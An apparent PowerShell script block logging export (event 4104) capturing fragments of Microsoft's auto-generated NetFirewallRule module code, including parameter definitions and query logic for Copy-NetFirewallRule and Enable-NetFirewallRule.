        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyAppId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyAppId})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyAppId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PackageFamilyName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PackageFamilyName})
        $__cmdletization_queryBuilder.FilterByProperty('PackageFamilyName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetFirewallRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallApplicationFilter') -and (@('ByAssociatedNetFirewallApplicationFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallApplicationFilter}, 'MSFT_NetFirewallRuleFilterByApplication', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetFirewallRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetFirewallRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetFirewallRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallSecurityFilter') -and (@('ByAssociatedNetFirewallSecurityFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallSecurityFilter}, 'MSFT_NetFirewallRuleFilterBySecurity', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallServiceFilter') -and (@('ByAssociatedNetFirewallServiceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallServiceFilter}, 'MSFT_NetFirewallRuleFilterByService', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetFirewallRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

      

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (16 of 19):
rameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('CloneObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Copy-NetFirewallRule' -Alias '*'
        

function Enable-NetFirewallRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal[]]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('LSM')]
    [ValidateNotNull()]
    [bool[]]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Owner},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyAppId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallApplicationFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallSecurityFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallServiceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Pa

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (15 of 19):
gin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EdgeTraversalPolicy})
        $__cmdletization_queryBuilder.FilterByProperty('EdgeTraversalPolicy', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LooseSourceMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LooseSourceMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LooseSourceMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LocalOnlyMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LocalOnlyMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LocalOnlyMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Owner') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Owner})
        $__cmdletization_queryBuilder.FilterByProperty('Owner', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyAppId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyAppId})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyAppId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PackageFamilyName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PackageFamilyName})
        $__cmdletization_queryBuilder.FilterByProperty('PackageFamilyName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetFirewallRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallApplicationFilter') -and (@('ByAssociatedNetFirewallApplicationFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallApplicationFilter}, 'MSFT_NetFirewallRuleFilterByApplication', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetFirewallRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetFirewallRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetFirewallRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallSecurityFilter') -and (@('ByAssociatedNetFirewallSecurityFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallSecurityFilter}, 'MSFT_NetFirewallRuleFilterBySecurity', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallServiceFilter') -and (@('ByAssociatedNetFirewallServiceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallServiceFilter}, 'MSFT_NetFirewallRuleFilterByService', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetFirewallRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
